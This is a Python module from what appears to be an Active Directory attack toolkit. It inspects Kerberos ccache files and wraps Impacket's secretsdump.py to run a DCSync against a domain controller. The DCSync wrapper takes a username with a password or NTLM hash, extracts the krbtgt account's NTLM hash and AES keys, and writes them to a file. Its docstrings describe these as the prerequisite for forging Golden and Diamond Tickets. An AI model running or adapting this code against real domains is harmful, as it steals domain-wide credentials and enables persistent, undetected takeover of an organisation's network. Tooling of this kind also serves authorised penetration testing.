"""
Ticket Utilities — Ticket inspection and KRBTGT extraction helpers.

Provides ccache file inspection (via klist or Impacket) and
DCSync wrapper for extracting the KRBTGT hash needed for
Golden and Diamond Ticket attacks.
"""

import os
import subprocess
from pathlib import Path

try:
    from impacket.krb5.ccache import CCache
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False


class TicketInspector:
    """Display information about .ccache ticket files."""

    @staticmethod
    def print_info(ccache_file: str):
        """Print ticket details from a ccache file."""
        try:
            result = subprocess.run(
                ["klist", ccache_file],
                capture_output=True, text=True, timeout=10,
            )
            if result.stdout:
                print("\n[*] Ticket Info:")
                for line in result.stdout.splitlines()[:10]:
                    print(f"    {line}")
                return
        except FileNotFoundError:
            pass
        except Exception:
            pass

        # Fallback: Impacket CCache parser
        if HAS_IMPACKET:
            try:
                ccache = CCache.loadFile(ccache_file)
                print("\n[*] Ticket Info (Impacket):")
                print(f"    Principal: {ccache.principal}")
            except Exception:
                pass


class DCSync:
    """Extract KRBTGT hash via DCSync — prerequisite for Golden/Diamond Tickets."""

    def __init__(self, domain: str, dc_ip: str, output_dir: Path):
        self.domain = domain
        self.dc_ip = dc_ip
        self.output_dir = output_dir

    def extract_krbtgt(
        self, username: str, password: str = "", ntlm_hash: str = ""
    ):
        """Run secretsdump.py DCSync targeting only the krbtgt account."""
        print(f"\n{'=' * 60}")
        print("EXTRACTING KRBTGT HASH VIA DCSYNC")
        print(f"{'=' * 60}")

        output_file = str(self.output_dir / "dcsync_krbtgt.txt")

        cmd = ["secretsdump.py"]
        if password:
            cmd += [f"{self.domain}/{username}:{password}@{self.dc_ip}"]
        elif ntlm_hash:
            cmd += [
                f"{self.domain}/{username}@{self.dc_ip}",
                "-hashes", f":{ntlm_hash}",
            ]
        else:
            print("[-] Need password or hash for DCSync")
            return

        cmd += [
            "-just-dc-user", "krbtgt",
            "-outputfile", str(self.output_dir / "krbtgt"),
        ]

        try:
            print("[*] Executing DCSync for krbtgt...")
            print(f"[*] Command: {' '.join(cmd)}")
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=60
            )

            if result.stdout:
                print("\n[+] DCSync Output:")
                for line in result.stdout.splitlines():
                    if "krbtgt" in line.lower() or "aes" in line.lower():
                        print(f"    {line}")

                with open(output_file, "w") as f:
                    f.write(result.stdout)
                print(f"\n[+] Saved to: {output_file}")
                print("[*] Extract the NTLM hash and AES256 key for ticket forging")
            else:
                print("[-] DCSync failed")
                if result.stderr:
                    print(f"    Error: {result.stderr[:300]}")

        except FileNotFoundError:
            print("[-] secretsdump.py not found")
        except Exception as e:
            print(f"[-] DCSync failed: {e}")